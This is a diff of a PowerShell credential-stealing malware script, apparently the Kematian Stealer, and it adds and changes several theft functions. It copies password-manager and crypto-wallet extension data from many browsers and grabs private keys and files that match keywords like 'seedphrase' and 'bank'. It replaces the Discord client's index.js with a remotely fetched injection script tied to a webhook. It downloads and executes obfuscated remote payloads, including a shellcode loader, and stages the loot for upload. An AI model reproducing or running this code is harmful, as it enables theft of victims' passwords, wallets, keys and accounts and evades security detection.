+        "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
+        "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
+        "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
+        "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
+        "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
+        "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
+        "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
+        "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
+    }
+    foreach ($browser in $browserPaths.GetEnumerator()) {
+        $browserName = $browser.Key
+        $browserPath = $browser.Value
+        if (Test-Path $browserPath) {
+            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
+                $localExtensionsSettingsDir = $_.FullName
+                foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
+                    $passwordmgrkey = $password_mgr_dir.Key
+                    $password_manager = $password_mgr_dir.Value
+                    $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
+                    if (Test-Path $extentionPath) {
+                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
+                            try {
+                                $password_mgr_browser = "$password_manager ($browserName)"
+                                $password_dir_path = Join-Path $password_managers $password_mgr_browser
+                                New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
+                                Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
+                                $locationFile = Join-Path $password_dir_path "Location.txt"
+                                $extentionPath | Out-File -FilePath $locationFile -Force
+                                Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
+                            }
+                            catch {
+                                Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
+                            }
+                        }
+                    }
+                }
+            }
+        }
+      }
+    }
+    password_managers
 
     function Local_Crypto_Wallets {
         $wallet_paths = @{
@@ -993,7 +863,7 @@ function Backup-Data {
         }
         $zephyr_path = "$env:appdata\Zephyr\wallets"
         New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
-        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force	}	
+        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force}	
         foreach ($wallet in $wallet_paths.Keys) {
             foreach ($pathName in $wallet_paths[$wallet].Keys) {
                 $sourcePath = $wallet_paths[$wallet][$pathName]
@@ -1007,6 +877,80 @@ function Backup-Data {
     }
     Local_Crypto_Wallets
 	
+    function browserwallets {
+    $browserPaths = @{
+        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
+        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
+        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
+        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
+        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
+        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
+        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
+        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
+        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
+    }
+    $walletDirs = @{
+        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
+        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
+        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
+        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
+        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
+        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
+        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
+        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
+        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
+        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
+        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
+        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
+        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
+        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
+        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
+        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
+        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
+        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
+        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
+        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
+        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
+        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
+        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
+        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
+    }
+    foreach ($browser in $browserPaths.GetEnumerator()) {
+        $browserName = $browser.Key
+        $browserPath = $browser.Value
+        if (Test-Path $browserPath) {
+            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
+                $localExtensionsSettingsDir = $_.FullName
+                foreach ($walletDir in $walletDirs.GetEnumerator()) {
+                    $walletKey = $walletDir.Key
+                    $walletName = $walletDir.Value
+                    $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
+                    if (Test-Path $extentionPath) {
+                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
+                            try {
+                                $wallet_browser = "$walletName ($browserName)"
+                                $walletDirPath = Join-Path $folder_crypto $wallet_browser
+                                New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
+                                Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
+                                $locationFile = Join-Path $walletDirPath "Location.txt"
+                                $extentionPath | Out-File -FilePath $locationFile -Force
+                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
+                            }
+                            catch {
+                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    }
+    browserwallets
+ 
+	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
@@ -1015,29 +959,13 @@ function Backup-Data {
     # Fix webcam hang with unsupported devices
     
     Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
-    $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
+    $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
 
-    # Works since most victims will have a weak password which can be bruteforced
-    function ExportPrivateKeys {
-        $privatekeysfolder = "$important_files\Certificates and Private Keys"
-        New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
-        $sourceDirectory = "$env:userprofile"
-        $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-
-        foreach ($extension in $fileExtensions) {
-            $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
-            foreach ($file in $foundFiles) {
-                Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
-            }
-        }
-    }
-    #ExportPrivateKeys
-
     function FilesGrabber {
-        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
+        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
         $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
@@ -1080,11 +1008,37 @@ function Backup-Data {
     if ($secure_dat -eq $true) {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
+
+
+    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+
+    foreach ($path in $discPaths) {
+        $skibidipath = Join-Path $locAppData $path
+        if (-not (Test-Path $skibidipath)) {
+            continue
+        }
+        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+                $files = Get-ChildItem $_.FullName
+                foreach ($file in $files) {
+                    if ($file.Name -eq "index.js") {
+                        $webClient = New-Object System.Net.WebClient
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
+                        if ($content -ne "") {
+                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
+                            $replacedContent | Set-Content -Path $file.FullName -Force
+                        }
+                    }
+                }
+            }
+        }
+    }
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
@@ -1123,6 +1077,33 @@ function Backup-Data {
         $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
+    
+    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
+    
+    function ProcessCookieFiles {
+        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
+        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
+        foreach ($file in $cookieFiles) {
+            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
+            $fileContents = Get-Content -Path $file.FullName
+            $domainCounts = @{}
+            foreach ($line in $fileContents) {
+                if ($line -match "^\s*(\S+)\s") {
+                    $domain = $matches[1].TrimStart('.')
+                    if ($domainCounts.ContainsKey($domain)) {
+                        $domainCounts[$domain]++
+                    }
+                    else {
+                        $domainCounts[$domain] = 1
+                    }
+                }
+            }
+            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
+            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
+            Set-Content -Path $outputFilePath -Value $outputString
+        }
+    }
+    ProcessCookieFiles 
 
     $zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
@@ -1131,7 +1112,7 @@ function Backup-Data {
 
 
     Write-Host $ZipFilePath
-
+    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     if ( -not ($write_disk_only)) {    
         Add-Type @"
 using System.Net;
